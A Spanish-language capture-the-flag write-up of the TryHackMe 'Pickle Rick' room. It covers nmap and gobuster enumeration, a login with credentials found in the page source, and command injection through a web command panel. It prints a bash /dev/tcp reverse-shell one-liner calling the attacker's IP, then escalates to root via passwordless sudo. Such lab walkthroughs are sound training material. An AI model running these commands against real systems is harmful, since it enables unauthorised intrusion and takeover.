---
title: Pickle Rick - TryHackMe
date: 2023-03-28
categories: [Writeup, THM]
tags: [Linux, THM, CTF, Easy, Command Injection]
img_path: /assets/img/commons/picklerick/
image: picklerick.png
---

¡Hola!

En este writeup, exploraremos la sala [**Pickle Rick**](https://tryhackme.com/room/picklerick) de TryHackMe, de dificultad facil según la plataforma. A través de esta sala temática de Rick y Morty, aprenderemos cómo explotar un servidor web para encontrar tres ingredientes que ayudarán a Rick a crear una poción y así transformarse de nuevo en humano a partir de un pepinillo.

¡Empecemos!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.116.102
PING 10.10.116.102 (10.10.116.102) 56(84) bytes of data.
64 bytes from 10.10.116.102: icmp_seq=1 ttl=61 time=289 ms

--- 10.10.116.102 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 289.403/289.403/289.403/0.000 ms
```

Dado que el `TTL` es cercano a 64, podemos inferir que la máquina objetivo probablemente este ejecutando un SO Linux.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS --min-rate 5000 10.10.116.102 -oG allPorts.txt
```

Donde:

- `-p-`: indica que se escaneen todos los puertos posibles (65535) del objetivo.
- `--open`: indica que se muestren solo los puertos abiertos, ignorando los cerrados o filtrados.
- `-n`: indica que no se haga resolución DNS.
- `-sS`: indica que se use el tipo de escaneo TCP SYN.
- `--min-rate 5000`: indica que se envíen al menos 5000 paquetes por segundo.
- `10.10.116.102`: indica la dirección IP del objetivo a escanear.
- `-oG allPorts.txt`: indica que se guarde el resultado del escaneo en formato grepeable en el archivo allPorts.txt.

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 22:50 -05
Nmap scan report for 10.10.116.102
Host is up (0.30s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.31 seconds
```

Vemos que únicamente tenemos dos puertos habilitados, `HTTP (80)` y `SSH (22)`.

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados, con el propósito de obtener más información sobre la configuración y posibles vulnerabilidades del sistema objetivo.

```bash
❯ nmap -p 22,80 -sV -sC --min-rate 5000 10.10.116.102 -oN services.txt
```

Donde:

- `-p 22,80`: indica que se escaneen solo los puertos especificados del objetivo.
- `-sV`: indica que se sondeen los puertos abiertos para determinar la información de servicio y versión.
- `-sC`: indica que se ejecute el script por defecto de Nmap, que realiza varias pruebas comunes como detección de vulnerabilidades o enumeración de recursos.
- `--min-rate 5000`: indica que se envíen al menos 5000 paquetes por segundo.
- `10.10.116.102`: indica la dirección IP del objetivo a escanear.
- `-oN services.txt`: indica que se guarde el resultado del escaneo en formato normal (fácil de leer por humanos) en el archivo services.txt.

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 22:52 -05
Nmap scan report for 10.10.116.102
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 69e453e95031291354e9f2345a53be27 (RSA)
|   256 752c185c02ceab38a2a58f3a29a54c68 (ECDSA)
|_  256 817547c47d3d484461f2935494f97faa (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.09 seconds
```

En el informe se destacan varios aspectos relevantes, entre los cuales se encuentra la posibilidad de que el sistema operativo de la máquina objetivo sea `Ubuntu`, así como la versión de los servicios SSH (`OpenSSH 7.2p2`) y HTTP (`Apache 2.4.18`).

### HTTP - 80

Tras identificar un servicio HTTP en el puerto 80, exploramos el contenido de la página web. Como vemos se trata de una página web de la serie "*Rick and Morty*". Observamos una referencia a "*BURRRP*", lo que asumimos como una posible pista para el uso de la herramienta `Burp Suite`. Sin embargo, resultó ser una distracción sin relevancia para el objetivo de nuestro análisis.

![web](web.png)

A continuación, procedemos a inspeccionar el código fuente de la página web y descubrimos la posible existencia de un usuario en el sistema: `R1ckRul3s`.

![user](user.png)

Realizamos una inspección del archivo `/robots.txt` con el fin de identificar algunos directorios de interés que el administrador del sitio web ha intentado ocultar. Sin embargo, no encontramos ningún directorio en específico, sino unos caracteres que en este momento no se consideran relevantes.

![robots](robots.png)

Procedimos a utilizar `GoBuster` para escanear directorios y archivos en la página web en busca de información que pudiera permitirnos acceder al servidor.

```bash
❯ gobuster dir -u http://10.10.116.102 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -req -x php,html,txt -t 100
```

Donde:

- `dir`: indica que se use el modo de fuerza bruta de directorios y archivos en sitios web.
- `-u http://10.10.116.102`: indica la URL del objetivo a escanear.
- `-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`: indica el archivo de wordlist a usar para el escaneo.
- `-r`: indica que se sigan las redirecciones HTTP.
- `-e`: indica que se muestre la URL completa en el resultado.
- `-q`: indica que se use el modo silencioso, es decir, que no se muestre el banner ni otros mensajes innecesarios.
- `-t 100`: indica el número de hilos concurrentes a usar.

```bash
http://10.10.116.102/login.php            (Status: 200) [Size: 882]
http://10.10.116.102/.php                 (Status: 403) [Size: 289]
http://10.10.116.102/.html                (Status: 403) [Size: 290]
http://10.10.116.102/index.html           (Status: 200) [Size: 1062]
http://10.10.116.102/assets               (Status: 200) [Size: 2189]
http://10.10.116.102/portal.php           (Status: 200) [Size: 882]
http://10.10.116.102/robots.txt           (Status: 200) [Size: 17]
http://10.10.116.102/.html                (Status: 403) [Size: 290]
http://10.10.116.102/.php                 (Status: 403) [Size: 289]
http://10.10.116.102/denied.php           (Status: 200) [Size: 882]
http://10.10.116.102/server-status        (Status: 403) [Size: 298]
```

Después de realizar el fuzzing, identificamos la presencia de un portal de inicio de sesión en la ruta `/login.php`.

![login](login.png)

Realizamos diversas pruebas con credenciales predeterminadas y finalmente tuvimos éxito utilizando el usuario `R1ckRul3s` y la contraseña `Wubbalubbadubdub`.

![portal](portal.png)

Al acceder al panel, nos encontramos con la posibilidad de ejecutar comandos a nivel del sistema. No obstante, detectamos que algunos de ellos estaban siendo sanitizados.

Al ejecutar el comando `ls` para listar los ficheros y directorios del sistema, obtenemos la siguiente información:

```bash
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Parece que hemos encontrado el primer ingrediente en el directorio actual. Para confirmarlo, leemos el contenido del archivo `Sup3rS3cretPickl3Ingred.txt` con el comando `less`, ya que `cat` parece estar bloqueado, y así obtenemos el primer ingrediente.

```bash
*** ******* ****
```

Si examinamos el archivo `clue.txt`, encontramos una pista que nos indica que debemos buscar el otro ingrediente en el sistema de archivos.

```bash
Look around the file system for the other ingredient.
```

Al utilizar el comando `ls ../../../home` para listar los usuarios del sistema, identificamos dos usuarios.

```bash
rick
ubuntu
```

Si ejecutamos el comando `ls ../../../home/rick` para listar el contenido del directorio del usuario `rick`, podemos obtener el segundo ingrediente.

```bash
second ingredients
```

Así que procedemos a leer el segundo ingrediente utilizando el comando `less ../../../home/rick/second\ ingredients`.

```bash
* ***** ****
```

## Explotación

---

### Command Injection

Dado que el panel de comandos tiene limitaciones en cuanto al uso de múltiples comandos, decidimos aprovechar la vulnerabilidad presente en la aplicación web: [Command Injection](https://owasp.org/www-community/attacks/Command_Injection). La inyección de comandos es un ataque en el que el objetivo es la ejecución de Comandos arbitrarios en el sistema operativo host a través de un aplicación. Los ataques de inyección de comandos son posibles cuando una aplicación pasa datos no seguros proporcionados por el usuario (formularios, cookies, encabezados HTTP, etc.) a un shell del sistema.

Bajo este contexto decidimos inyectar el siguiente comando simple que nos genere una reverse shell hacia nuestro equipo atacante.

```bash
bash -c "bash -i >& /dev/tcp/10.2.11.100/443 0>&1"
```

Antes de ejecutar el comando, es necesario ponerse a la escucha en el puerto especificado para recibir la shell como usuario `www-data`.

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.2.11.100] from (UNKNOWN) [10.10.116.102] 49586
bash: cannot set terminal process group (1347): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-116-102:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Escalación de privilegios

---

Después de obtener una shell en la máquina, nuestro objetivo es elevar nuestros privilegios y obtener acceso como usuario `root`. Una buena practica es listar los privilegios que tiene el usuario actual para ejecutar comandos con `sudo`.

```bash
www-data@ip-10-10-116-102:/home/rick$ sudo -l
Matching Defaults entries for www-data on
    ip-10-10-116-102.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-116-102.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

Podemos observar que el usuario `www-data` tiene permisos para ejecutar cualquier comando en el sistema sin necesidad de ingresar una contraseña. Por lo tanto, podemos cambiar fácilmente al usuario `root` utilizando el comando `sudo su`, aprovechando esta configuración de permisos del servidor.

```bash
www-data@ip-10-10-116-102:/var/www/html$ sudo su
sudo su
id
uid=0(root) gid=0(root) groups=0(root)
```

Ahora, como usuario `root`, podemos acceder a su directorio principal y leer el último ingrediente.

```bash
cd /root
ls
3rd.txt
snap
cat 3rd.txt
3rd ingredients: ***** *****
```

¡Happy Hacking!
